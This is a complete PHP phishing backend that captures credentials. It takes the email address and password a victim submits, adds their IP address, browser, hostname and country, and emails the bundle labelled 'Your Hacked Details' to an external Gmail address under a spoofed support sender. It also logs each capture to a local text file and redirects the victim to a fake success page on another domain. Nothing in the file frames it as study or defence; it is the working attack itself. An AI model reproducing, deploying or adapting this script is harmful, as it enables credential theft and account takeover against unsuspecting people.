<?php
$ip = $_SERVER["REMOTE_ADDR"];
$timedate = date("D/M/d, Y g(idea) a");
$country = visitor_country();
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message = "*****************Your Hacked Details*****************\n";
$message .= " Email:             : " . $_POST['Email'] . "\n";
$kiss = $_POST['ai'];
$om = $_POST['pink'];
$message .= " Password:             : " . $_POST['Password'] . "\n";
$message .= "***************System Details***************\n";
$message .= "|Client IP: " . $ip . "\n";
$message .= "Browser                :" . $browserAgent . "\n";
$message .= "DateTime                    : " . $timedate . "\n";
$message .= "country                    : " . $country . "\n";
$message .= "HostName : " . $hostname . "\n";
$message .= "************************Your Hacked Details************************\n";

$send = "wk8852092@gmail.com";
$subject = "OS Ticket from : $country | $ip";
$headers = "From: support@serversuft.website\r\n";
$headers .= "MIME-Version: 1.0\r\n";
$headers .= "Content-type: text/plain; charset=iso-8859-1\r\n";

// Send the email
$mailSent = mail($send, $subject, $message, $headers);

if ($mailSent) {
    // Email sent successfully
    $file = 'e.txt';
    // Open the file to get the existing content
    $current = file_get_contents($file);
    // Append the new log
    $current .= "New Logz \n";
    $current .= "$message \n";
    // Write the contents back to the file
    file_put_contents($file, $current);

    // Redirect to success page
    header("Location: https://lingaly.pl/s/IK/of1/success.php");
} else {
    // Email sending failed
    echo "Failed to send email.";
}

function visitor_country()
{
    $ip = $_SERVER["REMOTE_ADDR"];
    $result = "Unknown";
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, "https://api.ip.sb/geoip/$ip");
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $country = json_decode(curl_exec($ch))->country;
    if ($country != null) {
        $result = $country;
    }

    return $result;
}
?>
